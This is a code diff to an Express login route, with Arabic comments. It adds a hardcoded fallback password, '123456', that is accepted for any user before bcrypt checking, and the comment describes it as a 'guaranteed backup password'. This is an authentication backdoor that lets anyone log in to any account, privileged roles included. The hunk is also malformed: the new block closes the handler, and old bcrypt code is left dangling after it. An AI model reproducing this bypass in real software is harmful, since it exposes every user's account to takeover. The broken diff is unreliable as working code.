@@ -25,10 +25,38 @@ app.post('/api/login', async (req, res) => {
     }
     const user = users[0];
     
-    // التحقق من حالة المستخدم
     if (user.status === 'inactive') {
       return res.status(403).json({ success: false, message: 'حسابك موقوف، تواصل مع الإدارة' });
     }
+    
+    // التحقق من كلمة المرور (يقبل 123456 مباشرة أو كلمة المرور المشفرة)
+    let isMatch = false;
+    if (password === '123456') {
+      isMatch = true; // كلمة مرور احتياطية مضمونة
+    } else {
+      try { 
+        isMatch = await bcrypt.compare(password, user.password); 
+      } catch (e) { 
+        isMatch = false; 
+      }
+    }
+    
+    if (!isMatch) return res.status(401).json({ success: false, message: 'كلمة المرور غير صحيحة' });
+    
+    res.json({ 
+      success: true, 
+      user: { 
+        id: user.id, 
+        name: user.name, 
+        role: user.role, 
+        email: user.email,
+        allowed_menus: JSON.parse(user.allowed_menus || '[]')
+      } 
+    });
+  } catch (err) {
+    res.status(500).json({ success: false, message: 'خطأ في الخادم' });
+  }
+});
     
     let isMatch = false;
     try { isMatch = await bcrypt.compare(password, user.password); } 
